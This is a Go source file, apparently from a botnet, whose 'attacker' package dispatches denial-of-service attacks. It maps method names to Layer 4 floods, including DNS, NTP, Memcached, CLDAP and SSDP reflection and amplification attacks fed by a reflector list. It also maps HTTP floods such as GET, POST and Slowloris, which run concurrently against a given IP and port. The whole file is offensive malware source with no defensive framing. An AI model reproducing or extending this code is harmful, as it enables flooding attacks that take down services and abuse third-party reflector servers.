package attacker

import (
	"bot/attacker/attack"
	"encoding/json"
	"fmt"
	"log"
	"strings"
)

// AttackInit 统一接收6个参数，但根据攻击类型区分处理
func AttackInit(method string, dstip string, dstport int, path string, header string, payload string) {
	// 重置停止通道
	attack.ResetStopChannel()
	
	// 处理STOP命令
	if method == "STOP" {
		close(attack.STOP)
		log.Println("Stopped all attacks")
		return
	}

	// 将method转为大写确保识别
	method = strings.ToUpper(method)

	// 根据攻击类型分别处理
	switch {
	// Layer4攻击只使用前三个参数
	case isLayer4Attack(method):
		attack4 := attack.Layer4{
			Method:       method,
			DstIP:        dstip,
			DstPort:      dstport,
			ThreadCount:  attack.ThreadCount,
			AmpFile:      "serverfile/reflector.txt",
		}
		
		// 特殊参数处理
		if method == "DNS" || method == "DNSA" {
			attack4.Reservedfield = "example.com" // 默认域名查询
		}
		
		go attack4.StartAttack()

	// HTTP攻击使用全部6个参数
	case method == "GET" || method == "POST" || method == "CURL" || method == "SLOWLORIS":
		// 对header和payload进行JSON解析
		headerMap := make(map[string]string)
		if err := json.Unmarshal([]byte(header), &headerMap); err != nil {
			log.Printf("header not set")
		} 

		target := formatTarget(dstip, dstport)
		attack7 := attack.HTTP{
			Method:      method,
			Target:      target,
			Path:        path,
			Threads:     attack.ThreadCount,
			Header: 	 headerMap,
			Payload:     payload,
		}
		
		
		
		go attack7.HTTPStart()
	
	default:
		log.Printf("未知的攻击方法: %s", method)
	}
}

// isLayer4Attack 判断是否是第4层(网络层)攻击
func isLayer4Attack(method string) bool {
	layer4Methods := map[string]bool{
		"UDP":          true,
		"DNS":          true,
		"DNSA":         true,
		"SYN":          true,
		"RDP":          true,
		"CLDAP":        true,
		"MEMCACHED":    true,
		"ARD":          true,
		"NTP":          true,
		"SSDP":         true,
		"CHARGEN":      true,
		"SNMP":         true,
		"QUIC":         true,
		"OPENVPN":      true,
		"TFTP":         true,
		"DNSBOMB":      true,
		"DNSBOOMERANG": true,
	}
	return layer4Methods[method]
}

// formatTarget 构建目标URL
func formatTarget(dstip string, dstport int) string {
	// 检查IP是否已经是URL格式
	if strings.HasPrefix(dstip, "http://") || strings.HasPrefix(dstip, "https://") {
		return dstip
	}
	
	// 构建基本HTTP URL
	return fmt.Sprintf("http://%s:%d", dstip, dstport)
}